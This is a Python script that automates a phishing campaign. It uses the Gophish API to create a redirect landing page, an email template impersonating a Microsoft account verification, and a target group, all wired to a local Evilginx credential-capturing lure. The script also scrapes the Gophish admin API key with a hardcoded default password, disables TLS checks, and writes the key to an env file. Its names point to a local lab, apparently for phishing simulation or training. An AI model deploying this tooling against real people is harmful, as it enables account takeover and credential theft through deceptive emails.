#!/usr/bin/env python3
"""Create gophish resources wired to the local evilginx lure."""
import html
import json
import os
import re
import sys
import urllib.parse
import urllib.request
import ssl

GOPHISH = os.environ.get("GOPHISH_ADMIN", "https://127.0.0.1:3333")
API_KEY = os.environ.get("GOPHISH_API_KEY", "")
PASS = os.environ.get("GOPHISH_PASS", "Env@1234")
CFG = os.environ.get("EVILGINX_CFG", "/root/.evilginx/config.json")
PORT = os.environ.get("EVILGINX_PORT", "443")
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

def load_lure_url():
    with open(CFG) as f:
        data = json.load(f)
    path = data["lures"][0]["path"]
    domain = data["general"]["domain"]
    port = os.environ.get("EVILGINX_PORT", "443")
    if port in ("443", ""):
        return f"https://login.{domain}{path}"
    return f"https://login.{domain}:{port}{path}"

def api(method, path, body=None, key=None):
    headers = {"Content-Type": "application/json"}
    if key:
        headers["Authorization"] = f"Bearer {key}"
    data = None if body is None else json.dumps(body).encode()
    req = urllib.request.Request(GOPHISH + path, data=data, headers=headers, method=method)
    with urllib.request.urlopen(req, context=CTX) as resp:
        return json.load(resp)

def login_api_key():
    jar = {}
    login_html = urllib.request.urlopen(GOPHISH + "/login", context=CTX).read().decode()
    csrf = html.unescape(re.search(r'name="csrf_token" value="([^"]+)"', login_html).group(1))
    body = urllib.parse.urlencode({"username": "admin", "password": PASS, "csrf_token": csrf}).encode()
    req = urllib.request.Request(GOPHISH + "/login", data=body, method="POST")
    resp = urllib.request.urlopen(req, context=CTX)
    cookies = resp.headers.get("Set-Cookie", "")
    jar_cookie = cookies.split(";")[0] if cookies else ""

    settings_html = urllib.request.urlopen(
        urllib.request.Request(GOPHISH + "/settings", headers={"Cookie": jar_cookie}), context=CTX
    ).read().decode()
    m = re.search(r'id="api_key"[^>]*value="([^"]*)"', settings_html)
    return html.unescape(m.group(1)) if m else ""

def main():
    lure = load_lure_url()
    redirect = f"{lure}?email={{.Email}}"
    key = API_KEY or login_api_key()
    if not key:
        print("Set GOPHISH_API_KEY from Settings, or GOPHISH_PASS if still default.", file=sys.stderr)
        sys.exit(1)

    landing = api("POST", "/api/pages/", {
        "name": "Evilginx Redirect",
        "html": f'<html><head><meta http-equiv="refresh" content="0;url={redirect}"></head><body>Redirecting...</body></html>',
        "capture_credentials": False,
        "capture_passwords": False,
        "redirect_url": redirect,
    }, key)

    template = api("POST", "/api/templates/", {
        "name": "O365 Local Lab",
        "subject": "Action required: verify your account",
        "text": "Please verify your Microsoft account: {{.URL}}",
        "html": '<p>Hello {{.FirstName}},</p><p><a href="{{.URL}}">Verify Account</a></p>',
        "attachments": [],
    }, key)

    group = api("POST", "/api/groups/", {
        "name": "Local Test Group",
        "targets": [{"email": "victim@local.test", "first_name": "Test", "last_name": "User", "position": "Employee"}],
    }, key)

    env_path = os.path.join(os.path.dirname(__file__), "local-lab.env")
    with open(env_path, "w") as f:
        f.write(f"export EVILGINX_LURE_URL=\"{lure}\"\n")
        f.write(f"export GOPHISH_API_KEY=\"{key}\"\n")
        f.write(f"export GOPHISH_LANDING_PAGE_ID=\"{landing['id']}\"\n")
        f.write(f"export GOPHISH_TEMPLATE_ID=\"{template['id']}\"\n")
        f.write(f"export GOPHISH_GROUP_ID=\"{group['id']}\"\n")

    print(f"Lure URL     : {lure}?email=victim@local.test")
    print(f"Landing page : {landing['id']}")
    print(f"Template     : {template['id']}")
    print(f"Group        : {group['id']}")
    print(f"Saved        : {env_path}")

if __name__ == "__main__":
    main()
